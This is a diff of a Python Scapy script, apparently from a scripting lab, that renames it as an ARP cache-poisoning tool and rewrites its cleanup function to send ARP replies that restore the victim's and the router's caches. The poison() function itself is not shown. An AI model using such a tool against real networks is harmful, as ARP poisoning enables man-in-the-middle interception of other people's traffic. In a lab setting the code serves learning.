@@ -1,6 +1,6 @@
 #!/usr/bin/env python
 
-#Scapysend: python script to send ARP requests out over a network
+#ScapyArpPoison: python script to poison arp cache
 #Programmer: Malcolm Jefferson
 #sources: danmcinerney.org/arp-poisoning-with-python-2/, www.tabgen.com/blog/?p=13
 #sources(cont): PythonScriptingwithScapyLab.pdf
@@ -43,9 +43,11 @@ def poison(routerIP, victimIP, routerMAC, victimMAC):
 # packets to the victim and router updating ARP tables to store accurate
 # information about which IP address is linked to which MAC address.
 # hwdst ensures that the ARP replies are sent to everybody and their caches are restored
-def sendOut(routerIP,victimIP,routerMAC,victimMAC):
-	send(ARP(op=1, pdst=routerIP, psrc=victimIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=victimMAC), count=50)
-	send(ARP(op=1, pdst=victimIP, psrc=routerIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=routerMAC), count=50)
+def restore(routerIP,victimIP,routerMAC,victimMAC):
+	#hwdst will be the MAC of the router
+	send(ARP(op=1, pdst=routerIP, psrc=victimIP, hwdst=routerMAC, hwsrc=victimMAC), count=50)
+	#hwdst will be the MAC of the victim
+	send(ARP(op=1, pdst=victimIP, psrc=routerIP, hwdst=victimMAC, hwsrc=routerMAC), count=50)
 	sys.exit("out...")
 
 #check to see if the usr is root
